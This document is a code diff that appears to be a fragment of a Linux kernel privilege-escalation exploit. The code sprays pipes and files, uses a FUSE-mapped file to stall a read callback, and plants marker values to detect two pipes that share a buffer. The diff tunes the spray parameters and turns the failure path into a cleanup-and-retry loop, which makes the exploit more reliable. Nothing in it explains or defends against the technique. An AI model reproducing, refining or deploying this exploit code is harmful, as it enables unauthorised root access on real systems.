@@ -164,7 +164,7 @@ int eclipse_realloc(size_t size) {
 #define ARR_SIZE(arr) sizeof(arr) / sizeof(arr[0])
 
 int pipes[0x200][2];
-int spray_files [0x200];
+int spray_files [0x300];
 
 int main(int argc, char **argv, char **envp)
 {
@@ -178,6 +178,9 @@ int main(int argc, char **argv, char **envp)
       ;
 
     usleep(1000);
+
+try:
+
     void *p = mmap_fuse_file("file");
 
     for (uint i = 0; i < ARR_SIZE(pipes); ++i) {
@@ -192,7 +195,7 @@ int main(int argc, char **argv, char **envp)
     u64 var;
 
     for (uint i = 0; i < ARR_SIZE(pipes); i++) {
-        if (i % 0x10) {
+        if (i % 8) {
             read(pipes[i][0], &var, 8);
             if (var - 0xdeadbeef0000 != i && (var - 0xdeadbeef0000 < ARR_SIZE(pipes))) {
                 idx1 = i;
@@ -203,7 +206,7 @@ int main(int argc, char **argv, char **envp)
     }
 
     if (idx1 == -1 || idx2 == -1) {
-        goto end;
+        goto fail;
     }
 
     logOK("Found to dup pipes %u - %u", idx1, idx2);
@@ -240,10 +243,15 @@ int main(int argc, char **argv, char **envp)
 
     return 0;
 
-end:
+fail:
     logErr("Fail");
-    pthread_kill(th, 9);
-    WAIT();
+    for (uint i = 0; i < ARR_SIZE(pipes); i++) {
+        if(i%8){
+            close(pipes[i][0]);
+            close(pipes[i][1]);
+        }
+    }
+    goto try;
 }
 
 
@@ -275,13 +283,13 @@ int read_callback(const char *path, char *buf, size_t size, off_t offset,
         SAFE(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x10 * 0x1000));
     }
 
-    for (uint i = 0; i < ARR_SIZE(pipes); i += 0x10) {
+    for (uint i = 0; i < ARR_SIZE(pipes); i += 8) {
         close(pipes[i][0]);
         close(pipes[i][1]);
     }
 
     for (uint i = 0; i < ARR_SIZE(pipes); i++) {
-        if ((i % 0x10) ) {
+        if ((i % 8) ) {
             u64 pipe_magic = 0xdeadbeef0000 + i;
             write(pipes[i][1], &pipe_magic, 0x8);
         }
